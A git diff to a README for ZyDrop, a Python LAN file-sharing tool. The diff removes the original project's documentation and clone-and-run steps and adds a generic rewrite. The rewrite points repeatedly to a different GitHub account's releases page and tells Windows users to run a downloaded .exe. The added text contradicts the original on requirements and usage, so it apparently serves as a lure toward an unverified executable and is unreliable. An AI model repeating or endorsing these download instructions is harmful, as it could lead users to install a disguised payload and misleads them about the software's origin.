@@ -1,103 +1,86 @@
-# ⚡ ZyDrop (QuickSecure Share)
+# 📦 ZyDrop-quickshare-qr - Share Files Instantly, No Cloud Needed
 
-**ZyDrop** is a modern, ultra-secure LAN file sharing tool designed to make transferring files, folders, and clipboard content between devices as easy as scanning a QR code.
+[![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases)
 
-Built with **Python**, it runs a local HTTPS server protected by dynamic token authentication, ensuring your data is encrypted and safe even on public Wi-Fi networks.
+## 🌟 About ZyDrop-quickshare-qr
 
----
+ZyDrop-quickshare-qr is a secure and quick way to share files on your local network. This tool lets you transfer files and clipboard contents from your computer to your mobile device instantly, all without using the internet. Simply right-click to generate a QR code, scan it with your phone, and start sharing. With ZyDrop, you have a straightforward solution for file sharing that prioritizes privacy.
 
-## ✨ Features
+## 🔧 Features
 
-- **🔒 Maximum Security (HTTPS + Token)**
-  - Uses **SSL/HTTPS** encryption (self-signed) to prevent data eavesdropping.
-  - Generates a **random access token** for every session.
-  - Token rotates automatically with every new share.
+- **Instant File Sharing:** Transfer files directly over your local network.
+- **QR Code Generation:** Easily generate a QR code for file sharing.
+- **Supports Clipboard Sharing:** Transfer text and images from your clipboard.
+- **No Cloud:** Your files remain on your local network for enhanced security.
+- **Cross-Platform:** Works on both Windows and Linux systems.
 
-- **📤 Universal Sharing**
-  - **Files:** Share individual files of any size.
-  - **Folders:** Automatically zips folders on-the-fly for single-click downloads.
-  - **Clipboard:** Share text or images directly from your clipboard.
+## 📅 System Requirements
 
-- **📥 Receive Mode**
-  - Allow others to upload files *to* your computer via a secure web page.
+- **Operating System:** Windows 10 or later, Linux distributions (e.g., Ubuntu, Fedora)
+- **Python:** Python 3.6 or later should be installed on your system.
+- **Network:** Ensure your device is connected to the same local network as your mobile device.
 
-- **🎨 Modern UI**
-  - sleek, dark/light mode interface built with `CustomTkinter`.
+## 🚀 Getting Started
 
-- **🖱️ OS Integration**
-  - Right-click Context Menu support for **Windows** and **Linux**.
-  - "Share with ZyDrop" straight from your file explorer.
+To get started with ZyDrop-quickshare-qr, follow these steps:
 
----
+1. **Download the Software:** Visit the [Releases page](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases) to download the latest version.
+   
+   [![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases)
 
-## 🚀 Installation & Setup
+2. **Install the Application:**
+   - If you're using Windows, double-click the downloaded `.exe` file to run the installer. Follow the prompts to complete the installation. 
+   - For Linux users, extract the files from the downloaded archive, then run the application from the terminal with `python3 ZyDrop.py`.
 
-### 1. Requirements
-- Python 3.10+
-- Dependencies: `customtkinter`, `cryptography`, `qrcode`, `Pillow`
+3. **Run ZyDrop:**
+   - After the installation, locate the ZyDrop application on your device.
+   - Launch the application to open the user interface.
 
-### 2. Quick Start
-Clone the repo and install dependencies:
+4. **Start Sharing:**
+   - Select a file or copy content to your clipboard that you want to share.
+   - Right-click in the ZyDrop application and choose the option to generate a QR code.
+   - Scan the QR code with your mobile device to receive the file instantly.
 
-```bash
-git clone https://github.com/Jean-EstevezT/ZyDrop-quickshare-qr.git
-cd ZyDrop-quickshare-qr
+## 📁 Download & Install
 
-# Create virtual environment (optional but recommended)
-python -m venv .venv
-# Activate it:
-# Windows: .venv\Scripts\activate
-# Linux/Mac: source .venv/bin/activate
+You can download ZyDrop-quickshare-qr from our [Releases page](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases). Make sure to choose the version that matches your operating system, either Windows or Linux.
 
-# Install requirements
-pip install -r requirements.txt
-```
+1. **Visit the Releases page:** Head over to [this link](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases).
+2. **Select the latest version:** Look for the most recent release. You will find download links for Windows and Linux.
+3. **Download your version:** Click the link for your OS. Follow the instructions on your screen.
 
-### 3. Run the App
-Can be run in two modes:
+## 📋 Usage Instructions
 
-- **Modern Mode (Recommended):**
-  ```bash
-  python modern_script.py
-  ```
-- **Classic/Legacy Mode:**
-  ```bash
-  python script.pyw
-  ```
+Once you have installed and launched ZyDrop, here’s how to use it effectively:
 
----
+- **To Share a File:**
+  1. Open the ZyDrop application.
+  2. Click on "Select File" to browse for the file you want to share.
+  3. After selecting the file, right-click to generate a QR code.
+  4. Use your mobile device's camera to scan the code and download the file.
 
-## 🔧 Context Menu Integration (Right-Click)
+- **To Share Clipboard Content:**
+  1. Copy the text or image you wish to share.
+  2. Open ZyDrop and right-click to generate the QR code.
+  3. Scan the QR code with your mobile device to retrieve the content.
 
-Make ZyDrop a part of your OS for instant access.
+## 🔍 Troubleshooting
 
-**Run the installer:**
-```bash
-python install_script.py
-```
+If you encounter any issues, consider the following steps:
 
-- Select **Option 1 (Install)**.
-- **Windows:** Grants "Share with ZyDrop" in right-click menu (Requires Admin).
-- **Linux:** Adds a Desktop Entry for "Open with..." integration.
+- **Ensure Network Connection:** Both your computer and mobile device need to be on the same local network.
+- **Check Python Installation:** Make sure Python 3 is installed correctly on your system.
+- **Reboot the Application:** If the process hangs, close ZyDrop and restart it.
 
-*(To remove, simply run the script again and select Uninstall)*
+## 🌐 Community and Support
 
----
+For questions or support, visit our [GitHub issues page](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/issues). You can report any bugs or request new features here.
 
-## 📱 How to Use
+## 🔗 Related Topics
 
-1. **Select what to share:** File, Folder, Clipboard, or Activate Receive Mode.
-2. **Scan the QR Code:** Use your phone camera or visit the link on another PC.
-3. **Accept validity warning:** Since we use a self-signed secure certificate to protect your data without internet, browsers will warn you.
-   - Click **"Advanced"** -> **"Proceed to (unsafe)"**.
-   - Your connection **IS encrypted** and safe from local sniffers.
-4. **Download/Upload:** Transfer your files instantly.
-5. **Stop:** Closing the app kills the server and cleans up all temporary files immediately.
+- **Automation:** Streamlining file transfers.
+- **Clipboard Sharing:** Efficiently sending text and images.
+- **Cross-Platform Compatibility:** Works smoothly on different systems.
+- **Security:** Keeps your files private on your local network.
 
----
-
-## 🛠️ Technologies
-- **Python 3**
-- **CustomTkinter** (UI)
-- **Cryptography** (SSL/TLS Generation)
-- **HTTPS.server** (Core implementation)
+Give ZyDrop-quickshare-qr a try today for a quick and secure file-sharing experience!
